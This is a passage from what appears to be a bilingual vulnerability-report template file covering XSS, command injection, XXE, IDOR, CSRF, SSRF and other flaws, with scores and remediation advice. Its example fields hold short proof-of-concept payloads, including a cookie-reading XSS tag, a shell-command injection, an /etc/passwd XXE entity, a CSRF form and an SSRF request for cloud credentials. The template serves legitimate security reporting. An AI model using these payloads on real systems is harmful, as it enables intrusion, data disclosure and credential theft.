    recommendations_en: 'Do not store sensitive data on the device if possible. If storage is necessary, use the platform\'s secure storage APIs, such as Android\'s Keystore and iOS\'s Keychain. Encrypt all data before writing it to storage.',
    recommendations_es: 'No almacene datos sensibles en el dispositivo si es posible. Si el almacenamiento es necesario, utilice las APIs de almacenamiento seguro de la plataforma, como el Keystore de Android y el Keychain de iOS. Cifre todos los datos antes de escribirlos en el almacenamiento.',
    details_en: '[TODO Provide steps to reproduce, showing how to access the insecurely stored data using tools like `adb` or `iExplorer`.]',
    details_es: '[TODO Proporcionar pasos para reproducir, mostrando cómo acceder a los datos almacenados de forma insegura utilizando herramientas como `adb` o `iExplorer`.]',
    remediation_en: {
      shortTerm: 'Migrate the storage of sensitive data from insecure APIs (e.g., SharedPreferences) to secure APIs (Keystore/Keychain).',
      mediumTerm: 'Review the entire application to identify all instances of data storage and ensure they are secure.',
      longTerm: 'Implement a data classification policy to clearly define what data is sensitive and requires secure storage.',
    },
    remediation_es: {
      shortTerm: 'Migrar el almacenamiento de datos sensibles de APIs inseguras (p. ej., SharedPreferences) a APIs seguras (Keystore/Keychain).',
      mediumTerm: 'Revisar toda la aplicación para identificar todas las instancias de almacenamiento de datos y asegurarse de que sean seguras.',
      longTerm: 'Implementar una política de clasificación de datos para definir claramente qué datos son sensibles y requieren almacenamiento seguro.',
    },
    references: ['https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage'],
    tags: ['Mobile', 'Android', 'iOS', 'Insecure Storage']
  },
  {
    id: 'vuln-mobile-002',
    title_en: 'Insecure Communication',
    title_es: 'Comunicación Insegura',
    cwe: 'CWE-319',
    severity: 'High',
    cvss: {
      score: 8.1,
      vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N',
      attackVector: 'Network',
      attackComplexity: 'High',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'The mobile application communicates with its backend over an insecure channel or fails to properly validate server certificates, making it vulnerable to man-in-the-middle (MitM) attacks.',
    overview_es: 'La aplicación móvil se comunica con su backend a través de un canal no seguro o no valida correctamente los certificados del servidor, lo que la hace vulnerable a ataques de hombre en el medio (MitM).',
    technicalDescription_en: 'The application transmits sensitive data over HTTP instead of HTTPS. Alternatively, it communicates over HTTPS but does not implement certificate pinning or properly validate the server\'s TLS certificate. An attacker on the same network can intercept, read, and modify all traffic between the app and the server.',
    technicalDescription_es: 'La aplicación transmite datos sensibles a través de HTTP en lugar de HTTPS. Alternativamente, se comunica a través de HTTPS pero no implementa "certificate pinning" o no valida correctamente el certificado TLS del servidor. Un atacante en la misma red puede interceptar, leer y modificar todo el tráfico entre la aplicación y el servidor.',
    affectedComponents_en: 'All network requests made by the application to the backend API at [TODO api.example.com]',
    affectedComponents_es: 'Todas las solicitudes de red realizadas por la aplicación a la API del backend en [TODO api.example.com]',
    impact_en: 'An attacker can intercept and tamper with all data transmitted between the mobile app and the server, leading to the theft of credentials, session tokens, and other sensitive information.',
    impact_es: 'Un atacante puede interceptar y manipular todos los datos transmitidos entre la aplicación móvil y el servidor, lo que lleva al robo de credenciales, tokens de sesión y otra información sensible.',
    recommendations_en: 'Enforce HTTPS for all network communication. Implement strong certificate pinning to ensure the application only communicates with trusted servers.',
    recommendations_es: 'Hacer cumplir el uso de HTTPS para toda la comunicación de red. Implementar un "certificate pinning" fuerte para garantizar que la aplicación solo se comunique con servidores de confianza.',
    details_en: '[TODO Provide evidence of the MitM attack, showing intercepted traffic using a tool like Burp Suite or mitmproxy.]',
    details_es: '[TODO Proporcionar evidencia del ataque MitM, mostrando el tráfico interceptado utilizando una herramienta como Burp Suite o mitmproxy.]',
    remediation_en: {
      shortTerm: 'Enforce TLS for all application endpoints via the platform\'s network security configuration.',
      mediumTerm: 'Implement certificate pinning, bundling the server\'s public key or certificate within the mobile application.',
      longTerm: 'Develop a secure networking library for use across all mobile applications to ensure consistent security practices.',
    },
    remediation_es: {
      shortTerm: 'Hacer cumplir el uso de TLS para todos los endpoints de la aplicación a través de la configuración de seguridad de red de la plataforma.',
      mediumTerm: 'Implementar "certificate pinning", empaquetando la clave pública o el certificado del servidor dentro de la aplicación móvil.',
      longTerm: 'Desarrollar una librería de red segura para su uso en todas las aplicaciones móviles para garantizar prácticas de seguridad consistentes.',
    },
    references: ['https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication'],
    tags: ['Mobile', 'Android', 'iOS', 'MitM', 'TLS']
  },
  {
    id: 'vuln-004',
    title_en: 'Stored Cross-Site Scripting (XSS)',
    title_es: 'Cross-Site Scripting (XSS) Almacenado',
    cwe: 'CWE-79',
    severity: 'High',
    cvss: {
        score: 8.7,
        vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N',
        attackVector: 'Network',
        attackComplexity: 'Low',
        privilegesRequired: 'Low',
        userInteraction: 'Required',
        scope: 'Changed',
        confidentiality: 'High',
        integrity: 'High',
        availability: 'None',
    },
    overview_en: 'Stored XSS occurs when a malicious script is injected directly into a vulnerable web application. The injected script is then permanently stored on the target servers, such as in a database, and is later retrieved and executed by other users.',
    overview_es: 'El XSS Almacenado ocurre cuando un script malicioso se inyecta directamente en una aplicación web vulnerable. El script inyectado se almacena permanentemente en los servidores de destino, como en una base de datos, y luego es recuperado y ejecutado por otros usuarios.',
    technicalDescription_en: 'The application is vulnerable to Stored XSS because it fails to properly sanitize user-supplied data before storing it and rendering it back to other users. An attacker can submit malicious scripts that will be executed in the browser of anyone who views the affected page.',
    technicalDescription_es: 'La aplicación es vulnerable a XSS Almacenado porque no sanitiza correctamente los datos proporcionados por el usuario antes de almacenarlos y mostrarlos a otros usuarios. Un atacante puede enviar scripts maliciosos que se ejecutarán en el navegador de cualquiera que vea la página afectada.',
    affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The user profile page at `/profile/{username}`. The `bio` field is vulnerable.]',
    affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., La página de perfil de usuario en `/profile/{username}`. El campo `bio` es vulnerable.]',
    impact_en: 'An attacker can fully compromise a user\'s session, steal sensitive information like cookies, or perform actions on behalf of the user. Since the script is stored, it can impact a large number of users.',
    impact_es: 'Un atacante puede comprometer completamente la sesión de un usuario, robar información sensible como cookies o realizar acciones en nombre del usuario. Dado que el script se almacena, puede afectar a un gran número de usuarios.',
    recommendations_en: 'Implement robust, context-aware output encoding whenever user-supplied content is displayed. Use a library like DOMPurify to sanitize HTML content. A strong Content Security Policy (CSP) is also highly recommended.',
    recommendations_es: 'Implementar una codificación de salida robusta y consciente del contexto siempre que se muestre contenido proporcionado por el usuario. Utilizar una librería como DOMPurify para sanitizar el contenido HTML. También se recomienda encarecidamente una Política de Seguridad de Contenido (CSP) fuerte.',
    details_en: '[TODO Provide a detailed proof-of-concept. Example: Submitting `<img src=x onerror=alert(document.cookie)>` in a comment field.]',
    details_es: '[TODO Proporcionar una prueba de concepto detallada. Ejemplo: Enviar `<img src=x onerror=alert(document.cookie)>` en un campo de comentarios.]',
    remediation_en: {
        shortTerm: 'Apply immediate context-aware encoding to all dynamic content on the affected pages.',
        mediumTerm: 'Review and refactor all parts of the application that accept and display user content to ensure proper sanitization and encoding.',
        longTerm: 'Integrate security libraries for sanitization into the development lifecycle and train developers on XSS prevention.',
    },
    remediation_es: {
        shortTerm: 'Aplicar codificación de salida consciente del contexto de inmediato a todo el contenido dinámico en las páginas afectadas.',
        mediumTerm: 'Revisar y refactorizar todas las partes de la aplicación que aceptan y muestran contenido de usuario para garantizar una sanitización y codificación adecuadas.',
        longTerm: 'Integrar librerías de seguridad para la sanitización en el ciclo de vida del desarrollo y capacitar a los desarrolladores en la prevención de XSS.',
    },
    references: ['https://owasp.org/www-community/attacks/xss/'],
    tags: ['OWASP Top 10', 'XSS', 'A03:2021-Injection'],
  },
  {
      id: 'vuln-005',
      title_en: 'Command Injection',
      title_es: 'Inyección de Comandos',
      cwe: 'CWE-77',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can execute arbitrary commands on the host operating system. This vulnerability is possible when an application passes unsafe user-supplied data (e.g., form input, cookies) to a system shell.',
      overview_es: 'Un atacante puede ejecutar comandos arbitrarios en el sistema operativo anfitrión. Esta vulnerabilidad es posible cuando una aplicación pasa datos no seguros suministrados por el usuario (por ejemplo, entradas de formulario, cookies) a una shell del sistema.',
      technicalDescription_en: 'The application uses user input to build a command that is executed on the server. By providing malicious input containing shell metacharacters (e.g., `;`, `|`, `&&`), an attacker can append new commands.',
      technicalDescription_es: 'La aplicación utiliza la entrada del usuario para construir un comando que se ejecuta en el servidor. Al proporcionar una entrada maliciosa que contenga metacaracteres de shell (p. ej., `;`, `|`, `&&`), un atacante puede añadir nuevos comandos.',
      affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The file download functionality at `/download.php?file=...`]',
      affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., La funcionalidad de descarga de archivos en `/download.php?file=...`]',
      impact_en: 'Command Injection can lead to a full compromise of the underlying server, allowing an attacker to read/write files, install malware, pivot to other network systems, and exfiltrate data.',
      impact_es: 'La inyección de comandos puede llevar a un compromiso total del servidor subyacente, permitiendo a un atacante leer/escribir archivos, instalar malware, pivotar a otros sistemas de la red y exfiltrar datos.',
      recommendations_en: 'The best way to prevent Command Injection is to avoid calling out to OS commands directly. If unavoidable, use structured APIs that provide parameterization and strictly validate user input against a whitelist.',
      recommendations_es: 'La mejor manera de prevenir la inyección de comandos es evitar llamar directamente a los comandos del sistema operativo. Si es inevitable, utilice APIs estructuradas que proporcionen parametrización y valide estrictamente la entrada del usuario contra una lista blanca.',
      details_en: '[TODO Provide a detailed PoC. Example: `file=image.jpg; id` which executes the `id` command.]',
      details_es: '[TODO Proporcionar un PoC detallado. Ejemplo: `file=image.jpg; id` que ejecuta el comando `id`.]',
      remediation_en: {
          shortTerm: 'Implement a strict whitelist for all user input used in shell commands.',
          mediumTerm: 'Refactor the code to use language-specific APIs instead of external OS commands.',
          longTerm: 'Implement static analysis security testing (SAST) tools to detect command injection flaws during development.',
      },
      remediation_es: {
          shortTerm: 'Implementar una lista blanca estricta para todas las entradas de usuario utilizadas en los comandos de shell.',
          mediumTerm: 'Refactorizar el código para usar APIs específicas del lenguaje en lugar de comandos externos del sistema operativo.',
          longTerm: 'Implementar herramientas de prueba de seguridad de análisis estático (SAST) para detectar fallos de inyección de comandos durante el desarrollo.',
      },
      references: ['https://owasp.org/www-community/attacks/Command_Injection'],
      tags: ['OWASP Top 10', 'Injection'],
  },
  {
      id: 'vuln-006',
      title_en: 'XML External Entity (XXE)',
      title_es: 'Entidad Externa XML (XXE)',
      cwe: 'CWE-611',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'Low',
          availability: 'None',
      },
      overview_en: 'An attacker can interfere with an application\'s processing of XML data. This may allow an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application can access.',
      overview_es: 'Un atacante puede interferir con el procesamiento de datos XML de una aplicación. Esto puede permitir a un atacante ver archivos en el sistema de archivos del servidor de la aplicación e interactuar con cualquier sistema de back-end o externo al que la aplicación pueda acceder.',
      technicalDescription_en: 'The application\'s XML parser is configured to process external entities from user-supplied XML. An attacker can craft a malicious XML payload with a DOCTYPE declaration that defines an external entity, pointing to a local file or an internal network resource.',
      technicalDescription_es: 'El analizador XML de la aplicación está configurado para procesar entidades externas de XML suministrado por el usuario. Un atacante puede crear una carga útil XML maliciosa con una declaración DOCTYPE que define una entidad externa, apuntando a un archivo local o un recurso de red interno.',
      affectedComponents_en: '[TODO Specify the vulnerable component, e.g., The file upload feature that processes XML files.]',
      affectedComponents_es: '[TODO Especificar el componente vulnerable, p. ej., La función de carga de archivos que procesa archivos XML.]',
      impact_en: 'XXE can lead to disclosure of local files (e.g., /etc/passwd), server-side request forgery (SSRF) to access internal network resources, or denial of service (DoS) via the "billion laughs" attack.',
      impact_es: 'XXE puede conducir a la divulgación de archivos locales (p. ej., /etc/passwd), falsificación de solicitudes del lado del servidor (SSRF) para acceder a recursos de la red interna, o denegación de servicio (DoS) a través del ataque "billion laughs".',
      recommendations_en: 'The most effective way to prevent XXE is to disable Document Type Definitions (DTD) and external entities completely in the XML parser configuration. If this is not possible, apply input validation and sanitization.',
      recommendations_es: 'La forma más efectiva de prevenir XXE es deshabilitar las Definiciones de Tipo de Documento (DTD) y las entidades externas por completo en la configuración del analizador XML. Si esto no es posible, aplique validación y sanitización de entradas.',
      details_en: '[TODO Provide a malicious XML PoC. Example: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`]',
      details_es: '[TODO Proporcionar un PoC XML malicioso. Ejemplo: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`]',
      remediation_en: {
          shortTerm: 'Disable DTD processing in the application\'s XML parser immediately.',
          mediumTerm: 'Upgrade all XML parsers and libraries to versions that are not vulnerable by default.',
          longTerm: 'Avoid data serialization formats that are prone to complex attacks like XXE. Prefer simpler formats like JSON.',
      },
      remediation_es: {
          shortTerm: 'Deshabilitar el procesamiento de DTD en el analizador XML de la aplicación de inmediato.',
          mediumTerm: 'Actualizar todos los analizadores y librerías XML a versiones que no sean vulnerables por defecto.',
          longTerm: 'Evitar formatos de serialización de datos propensos a ataques complejos como XXE. Preferir formatos más simples como JSON.',
      },
      references: ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'],
      tags: ['OWASP Top 10', 'XXE', 'A05:2021-Security_Misconfiguration'],
  },
  {
      id: 'vuln-007',
      title_en: 'Insecure Direct Object Reference (IDOR)',
      title_es: 'Referencia Directa Insegura a Objetos (IDOR)',
      cwe: 'CWE-639',
      severity: 'High',
      cvss: {
          score: 8.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'None',
      },
      overview_en: 'An attacker can gain unauthorized access to data by manipulating a user-supplied identifier. The application takes user-supplied input and uses it to retrieve a database record or a file without performing sufficient authorization checks.',
      overview_es: 'Un atacante puede obtener acceso no autorizado a datos manipulando un identificador suministrado por el usuario. La aplicación toma la entrada suministrada por el usuario y la usa para recuperar un registro de base de datos o un archivo sin realizar suficientes verificaciones de autorización.',
      technicalDescription_en: 'The application exposes a direct reference to an internal implementation object, such as a file or database key. By modifying the value of a parameter (e.g., `invoice_id=123` to `invoice_id=124`), an attacker can access resources belonging to other users.',
      technicalDescription_es: 'La aplicación expone una referencia directa a un objeto de implementación interna, como una clave de archivo o de base de datos. Al modificar el valor de un parámetro (p. ej., `invoice_id=123` a `invoice_id=124`), un atacante puede acceder a recursos que pertenecen a otros usuarios.',
      affectedComponents_en: '[TODO Specify the vulnerable endpoint, e.g., `/api/invoices/{invoice_id}`]',
      affectedComponents_es: '[TODO Especificar el endpoint vulnerable, p. ej., `/api/invoices/{invoice_id}`]',
      impact_en: 'IDOR can lead to unauthorized disclosure, modification, or destruction of data. Attackers can access other users\' accounts, private messages, financial information, and other sensitive data.',
      impact_es: 'IDOR puede conducir a la divulgación, modificación o destrucción no autorizada de datos. Los atacantes pueden acceder a las cuentas de otros usuarios, mensajes privados, información financiera y otros datos sensibles.',
      recommendations_en: 'Implement access control checks on every user request for data. The application should verify that the current user is authorized to access the requested resource. Using indirect, per-user, or session-based references can also be an effective mitigation.',
      recommendations_es: 'Implementar controles de acceso en cada solicitud de datos del usuario. La aplicación debe verificar que el usuario actual está autorizado para acceder al recurso solicitado. Usar referencias indirectas, por usuario o basadas en sesión también puede ser una mitigación efectiva.',
      details_en: '[TODO Provide a PoC. Example: A logged-in user navigates to `/my-orders?id=100`. By changing the ID to 101, they can view another user\'s order.]',
      details_es: '[TODO Proporcionar un PoC. Ejemplo: Un usuario autenticado navega a `/mis-pedidos?id=100`. Al cambiar el ID a 101, puede ver el pedido de otro usuario.]',
      remediation_en: {
          shortTerm: 'Enforce ownership checks on all affected endpoints to ensure users can only access their own resources.',
          mediumTerm: 'Replace direct object references (e.g., database IDs) with indirect reference maps that are unique to each user.',
          longTerm: 'Conduct a full review of the authorization logic across the application. Implement security tests to verify access controls.',
      },
      remediation_es: {
          shortTerm: 'Hacer cumplir las verificaciones de propiedad en todos los endpoints afectados para garantizar que los usuarios solo puedan acceder a sus propios recursos.',
          mediumTerm: 'Reemplazar las referencias directas a objetos (p. ej., IDs de base de datos) con mapas de referencia indirecta que sean únicos para cada usuario.',
          longTerm: 'Realizar una revisión completa de la lógica de autorización en toda la aplicación. Implementar pruebas de seguridad para verificar los controles de acceso.',
      },
      references: ['https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control'],
      tags: ['OWASP Top 10', 'Broken Access Control', 'A01:2021-Broken_Access_Control'],
  },
  {
      id: 'vuln-008',
      title_en: 'Security Misconfiguration',
      title_es: 'Configuración de Seguridad Incorrecta',
      cwe: 'CWE-16',
      severity: 'High',
      cvss: {
          score: 7.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'This vulnerability occurs when a system or application component is configured incorrectly, leading to security holes. Examples include running in debug mode in production, having unnecessary features enabled, or displaying overly verbose error messages.',
      overview_es: 'Esta vulnerabilidad ocurre cuando un sistema o componente de la aplicación se configura incorrectamente, lo que genera agujeros de seguridad. Los ejemplos incluyen ejecutar en modo de depuración en producción, tener funciones innecesarias habilitadas o mostrar mensajes de error demasiado detallados.',
      technicalDescription_en: 'The application or its underlying infrastructure has insecure settings. This can include default accounts with unchanged passwords, directory listing enabled on the web server, or misconfigured cloud services (e.g., publicly accessible S3 buckets).',
      technicalDescription_es: 'La aplicación o su infraestructura subyacente tienen configuraciones inseguras. Esto puede incluir cuentas predeterminadas con contraseñas sin cambios, listado de directorios habilitado en el servidor web o servicios en la nube mal configurados (p. ej., buckets S3 de acceso público).',
      affectedComponents_en: '[TODO Specify the misconfigured component, e.g., The web server is configured with directory listing enabled on `/assets/`.]',
      affectedComponents_es: '[TODO Especificar el componente mal configurado, p. ej., El servidor web está configurado con el listado de directorios habilitado en `/assets/`.]',
      impact_en: 'Security misconfigurations can lead to information disclosure, unauthorized access, or a full system compromise, depending on the nature of the misconfiguration.',
      impact_es: 'Las configuraciones de seguridad incorrectas pueden conducir a la divulgación de información, acceso no autorizado o un compromiso total del sistema, dependiendo de la naturaleza de la configuración incorrecta.',
      recommendations_en: 'Implement a hardening process for all application and infrastructure components. This should include disabling unnecessary features, changing default credentials, and applying security best practices. Regularly scan for misconfigurations.',
      recommendations_es: 'Implementar un proceso de "hardening" para todos los componentes de la aplicación y la infraestructura. Esto debe incluir la desactivación de funciones innecesarias, el cambio de credenciales predeterminadas y la aplicación de las mejores prácticas de seguridad. Escanear regularmente en busca de configuraciones incorrectas.',
      details_en: '[TODO Provide details of the misconfiguration. Example: Navigating to `https://example.com/admin/` reveals a directory listing because `Options +Indexes` is set in the Apache configuration.]',
      details_es: '[TODO Proporcionar detalles de la configuración incorrecta. Ejemplo: Navegar a `https://example.com/admin/` revela un listado de directorios porque `Options +Indexes` está establecido en la configuración de Apache.]',
      remediation_en: {
          shortTerm: 'Immediately correct the specific misconfiguration (e.g., disable directory listing).',
          mediumTerm: 'Develop and apply a security hardening baseline for all servers and services.',
          longTerm: 'Automate configuration management and use Infrastructure as Code (IaC) with security scanning to prevent misconfigurations from being deployed.',
      },
      remediation_es: {
          shortTerm: 'Corregir inmediatamente la configuración incorrecta específica (p. ej., deshabilitar el listado de directorios).',
          mediumTerm: 'Desarrollar y aplicar una línea base de "hardening" de seguridad para todos los servidores y servicios.',
          longTerm: 'Automatizar la gestión de la configuración y usar Infraestructura como Código (IaC) con escaneo de seguridad para evitar que se implementen configuraciones incorrectas.',
      },
      references: ['https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration'],
      tags: ['OWASP Top 10', 'Misconfiguration', 'A05:2021-Security_Misconfiguration'],
  },
  {
      id: 'vuln-009',
      title_en: 'Cross-Site Request Forgery (CSRF)',
      title_es: 'Falsificación de Solicitudes entre Sitios (CSRF)',
      cwe: 'CWE-352',
      severity: 'Medium',
      cvss: {
          score: 6.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'Required',
          scope: 'Unchanged',
          confidentiality: 'None',
          integrity: 'High',
          availability: 'None',
      },
      overview_en: 'An attacker can trick a logged-in user into performing an unwanted action. This is possible when an application fails to differentiate between legitimate requests and forged requests initiated by a third-party website.',
      overview_es: 'Un atacante puede engañar a un usuario autenticado para que realice una acción no deseada. Esto es posible cuando una aplicación no diferencia entre solicitudes legítimas y solicitudes falsificadas iniciadas por un sitio web de terceros.',
      technicalDescription_en: 'The application relies solely on session cookies to identify the user and authenticate state-changing requests (e.g., updating a profile, transferring funds). An attacker can host a malicious webpage that sends a request to the vulnerable application. If a user visits this page while logged in to the application, their browser will automatically include their session cookie, causing the unwanted action to be performed.',
      technicalDescription_es: 'La aplicación se basa únicamente en las cookies de sesión para identificar al usuario y autenticar las solicitudes que cambian el estado (p. ej., actualizar un perfil, transferir fondos). Un atacante puede alojar una página web maliciosa que envía una solicitud a la aplicación vulnerable. Si un usuario visita esta página mientras está conectado a la aplicación, su navegador incluirá automáticamente su cookie de sesión, lo que provocará que se realice la acción no deseada.',
      affectedComponents_en: '[TODO Specify the vulnerable endpoint, e.g., The `/user/change-password` endpoint is vulnerable to CSRF.]',
      affectedComponents_es: '[TODO Especificar el endpoint vulnerable, p. ej., El endpoint `/user/change-password` es vulnerable a CSRF.]',
      impact_en: 'A successful CSRF attack can result in state-changing actions being performed on behalf of the victim, such as changing their email address, password, or making purchases.',
      impact_es: 'Un ataque CSRF exitoso puede resultar en acciones que cambian el estado en nombre de la víctima, como cambiar su dirección de correo electrónico, contraseña o realizar compras.',
      recommendations_en: 'The most common and effective mitigation is the use of a unique, unpredictable anti-CSRF token that is tied to the user\'s session. This token should be required for all state-changing requests. Another modern approach is to use SameSite cookies (Strict or Lax).',
      recommendations_es: 'La mitigación más común y efectiva es el uso de un token anti-CSRF único e impredecible que está vinculado a la sesión del usuario. Este token debe ser requerido para todas las solicitudes que cambian el estado. Otro enfoque moderno es usar cookies SameSite (Strict o Lax).',
      details_en: '[TODO Provide a PoC. Example: An attacker hosts a page with an auto-submitting form: `<form action="https://vulnerable-site.com/user/change-email" method="POST"><input type="hidden" name="email" value="attacker@evil.com" /></form>`]',
      details_es: '[TODO Proporcionar un PoC. Ejemplo: Un atacante aloja una página con un formulario que se envía automáticamente: `<form action="https://sitio-vulnerable.com/user/change-email" method="POST"><input type="hidden" name="email" value="attacker@evil.com" /></form>`]',
      remediation_en: {
          shortTerm: 'Implement anti-CSRF tokens on all state-changing form submissions.',
          mediumTerm: 'Set the SameSite attribute on session cookies to `Strict` or `Lax` to prevent browsers from sending them in cross-site requests.',
          longTerm: 'Ensure the chosen web framework has built-in CSRF protection and that it is enabled and configured correctly for the entire application.',
      },
      remediation_es: {
          shortTerm: 'Implementar tokens anti-CSRF en todos los envíos de formularios que cambian el estado.',
          mediumTerm: 'Establecer el atributo SameSite en las cookies de sesión en `Strict` o `Lax` para evitar que los navegadores las envíen en solicitudes entre sitios.',
          longTerm: 'Asegurarse de que el framework web elegido tenga protección CSRF incorporada y que esté habilitada y configurada correctamente para toda la aplicación.',
      },
      references: ['https://owasp.org/www-community/attacks/csrf'],
      tags: ['OWASP Top 10', 'CSRF', 'A01:2021-Broken_Access_Control'],
  },
  {
      id: 'vuln-010',
      title_en: 'Server-Side Request Forgery (SSRF)',
      title_es: 'Falsificación de Solicitudes del Lado del Servidor (SSRF)',
      cwe: 'CWE-918',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can induce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing. This allows the attacker to use the vulnerable server as a proxy to scan internal networks, access internal services, or interact with cloud provider metadata endpoints.',
      overview_es: 'Un atacante puede inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a un dominio arbitrario elegido por el atacante. Esto permite al atacante usar el servidor vulnerable como un proxy para escanear redes internas, acceder a servicios internos o interactuar con los endpoints de metadatos del proveedor de la nube.',
      technicalDescription_en: 'The application fetches a resource based on a user-supplied URL but fails to properly validate it. An attacker can provide a URL that points to an internal IP address or a cloud metadata service (like `169.254.169.254`), tricking the server into making a request on their behalf.',
      technicalDescription_es: 'La aplicación obtiene un recurso basado en una URL proporcionada por el usuario pero no la valida correctamente. Un atacante puede proporcionar una URL que apunte a una dirección IP interna o a un servicio de metadatos en la nube (como `169.254.169.254`), engañando al servidor para que realice una solicitud en su nombre.',
      affectedComponents_en: '[TODO Specify the vulnerable functionality, e.g., A feature that generates a PDF from a URL provided by the user.]',
      affectedComponents_es: '[TODO Especificar la funcionalidad vulnerable, p. ej., Una función que genera un PDF a partir de una URL proporcionada por el usuario.]',
      impact_en: 'SSRF can lead to scanning of internal networks, sensitive data exfiltration (including cloud credentials), and interaction with internal services that are not directly exposed to the internet. This can serve as a pivot point for further attacks.',
      impact_es: 'SSRF puede conducir al escaneo de redes internas, la exfiltración de datos sensibles (incluidas las credenciales de la nube) y la interacción con servicios internos que no están expuestos directamente a Internet. Esto puede servir como un punto de pivote para ataques posteriores.',
      recommendations_en: 'The primary defense against SSRF is to maintain a whitelist of allowed domains, protocols, and IP addresses that the server is permitted to access. All user-supplied URLs must be validated against this list. Network-level controls to restrict outgoing traffic from the server are also crucial.',
      recommendations_es: 'La defensa principal contra SSRF es mantener una lista blanca de dominios, protocolos y direcciones IP permitidos a los que el servidor tiene permiso para acceder. Todas las URL proporcionadas por el usuario deben validarse contra esta lista. Los controles a nivel de red para restringir el tráfico saliente del servidor también son cruciales.',
      details_en: '[TODO Provide a PoC. Example: An API endpoint `/api/image_proxy?url=...` is called with `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.`]',
      details_es: '[TODO Proporcionar un PoC. Ejemplo: Se llama a un endpoint de API `/api/image_proxy?url=...` con `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.`]',
      remediation_en: {
          shortTerm: 'Implement a strict whitelist of allowed domains for the vulnerable feature.',
          mediumTerm: 'Apply network segmentation and firewall rules to prevent the application server from initiating connections to internal network ranges and metadata services.',
          longTerm: 'Conduct a thorough code review of all functionalities that make outbound requests based on user input.',
      },
      remediation_es: {
          shortTerm: 'Implementar una lista blanca estricta de dominios permitidos para la función vulnerable.',
          mediumTerm: 'Aplicar segmentación de red y reglas de firewall para evitar que el servidor de aplicaciones inicie conexiones a rangos de red internos y servicios de metadatos.',
          longTerm: 'Realizar una revisión de código exhaustiva de todas las funcionalidades que realizan solicitudes salientes basadas en la entrada del usuario.',
      },
      references: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
      tags: ['OWASP Top 10', 'SSRF', 'A10:2021-Server-Side_Request_Forgery'],
  },
  {
      id: 'vuln-011',
      title_en: 'Insecure File Upload',
      title_es: 'Carga de Archivos Insegura',
      cwe: 'CWE-434',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'An attacker can upload a file with malicious content, such as a web shell, which can then be executed on the server. This is possible when the application fails to properly validate the type, content, or size of uploaded files.',
      overview_es: 'Un atacante puede subir un archivo con contenido malicioso, como una web shell, que luego puede ser ejecutado en el servidor. Esto es posible cuando la aplicación no valida correctamente el tipo, contenido o tamaño de los archivos subidos.',
      technicalDescription_en: 'The application\'s file upload functionality has weak validation. It may only check the `Content-Type` header or the file extension, both of which can be easily spoofed by an attacker. By uploading a file with a double extension (e.g., `shell.php.jpg`) or manipulating the request, an attacker can bypass these checks and place an executable script in a web-accessible directory.',
